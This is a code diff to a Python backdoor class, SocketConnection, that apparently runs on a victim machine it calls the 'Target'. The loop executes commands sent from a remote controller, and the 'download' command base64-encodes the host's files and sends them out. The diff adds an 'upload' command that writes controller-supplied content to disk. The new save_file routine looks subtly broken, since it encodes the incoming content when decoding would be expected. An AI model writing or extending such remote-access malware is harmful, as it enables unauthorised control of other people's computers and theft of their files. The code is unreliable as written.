@@ -34,12 +34,21 @@ class SocketConnection:
         os.chdir(directory)
         return "cd \\" + directory
 
-    # Getting file contents
+    # Downloading file contents
     def getting_file_contents(self,path):
         with open(path, "rb") as my_file:
             file_bytes = my_file.read()
             return base64.b64encode(file_bytes).decode() # Returns string
             #return base64.b64encode(my_file.read()).decode('ascii')
+
+    # Uploading files to Target
+    def save_file(self,path,content):
+        try:
+            with open(path,"wb") as my_file:
+                my_file.write(base64.b64encode(content))
+                return "Uploaded successfully"
+        except Exception:
+            return "Error uploading file"
 
     def start_socket(self):
         while True: # Create infinite loop of execution of commands
@@ -51,6 +60,8 @@ class SocketConnection:
                 command_output = self.cd_command(command[1])
             elif command[0] == "download":
                 command_output = self.getting_file_contents(command[1])
+            elif command[0] == "upload":
+                command_output = self.save_file(command[1],command[2])
             else:
                 command_output = self.command_execution(command).decode()
             self.json_send(command_output)
